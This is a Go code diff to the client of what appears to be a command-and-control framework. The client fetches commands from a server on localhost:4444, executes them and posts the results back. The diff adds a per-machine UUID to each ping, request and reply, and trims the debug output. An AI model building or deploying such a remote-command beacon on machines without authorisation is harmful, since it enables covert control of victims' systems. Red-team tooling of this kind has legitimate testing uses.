@@ -8,14 +8,16 @@ import (
 	"net/http"
 
 	"github.com/dobin/antnium/model"
+	"github.com/google/uuid"
 )
 
 type Client struct {
-	port int
+	port       int
+	computerId string
 }
 
 func NewClient(port int) Client {
-	w := Client{port}
+	w := Client{port, uuid.New().String()}
 	return w
 }
 
@@ -25,17 +27,16 @@ func (s Client) Start() {
 	s.sendPing()
 	command := s.getCommand()
 	command.Execute()
-	fmt.Println("My response: " + command.Response())
 	s.sendCommand(command)
 }
 
 func (s Client) sendPing() {
-	pingCommand := model.NewCommandPing("0", "ooy!")
+	pingCommand := model.NewCommandPing(s.computerId, "0", "ooy!")
 	s.sendCommand(pingCommand)
 }
 
 func (s Client) getCommand() model.Command {
-	resp, err := http.Get("http://localhost:4444/getCommand")
+	resp, err := http.Get("http://localhost:4444/getCommand/" + s.computerId)
 	if err != nil {
 		// handle error
 	}
@@ -50,17 +51,17 @@ func (s Client) getCommand() model.Command {
 	}
 	bodyString := string(bodyBytes)
 
-	fmt.Println("Response: ")
-	fmt.Println(bodyString)
+	fmt.Println("<- " + bodyString)
 
 	command := model.JsonToCommand(bodyString)
 	return command
 }
 
 func (s Client) sendCommand(command model.Command) {
+	command.SetComputerId(s.computerId)
 	json := command.Json()
 	url := "http://localhost:4444/sendCommand"
-	fmt.Println("Sending: " + json)
+	fmt.Println("-> " + json)
 	var jsonStr = []byte(json)
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
 	req.Header.Set("Content-Type", "application/json")
